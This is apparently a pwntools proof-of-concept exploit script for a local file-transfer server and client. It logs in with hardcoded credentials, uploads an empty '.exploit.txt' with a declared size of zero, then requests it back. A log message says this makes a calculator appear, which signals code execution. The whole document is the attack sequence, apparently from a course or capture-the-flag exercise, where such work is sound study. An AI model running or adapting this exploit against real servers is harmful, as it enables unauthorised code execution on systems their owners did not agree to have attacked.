from pwn import *
import os

context.clear(arch = 'amd64')

server = process('bin/server')
client = process(['bin/client', '127.0.0.1', '1337'])

#Logging in
login = "login Acidburn\n"
passw = "pass CrashOverride\n"
client.sendline(login)
client.sendline(passw)
log.info("server after login:\n %s" % server.recv(timeout=0.5))
log.info("client after login:\n %s" % client.recv(timeout=0.5))

#creating empty file
open('.exploit.txt', 'a').close()

#sending put
client.sendline("put .exploit.txt 0")
log.info("server after command 'put .exploit.txt 0':\n %s" % server.recv(timeout=0.5))
log.info("client after command 'put .exploit.txt 0':\n %s" % client.recv(timeout=0.5))

#sending get
client.sendline("get .exploit.txt")
log.info("server after command 'get .exploit.txt':\n %s" % server.recv(timeout=0.5))
log.info("client after command 'get .exploit.txt':\n %s" % client.recv(timeout=0.5))

log.info("sleeping 5s so that you can admire calculator")
sleep(5)

# Clean up
os.remove(".exploit.txt")
client.close()
server.close()
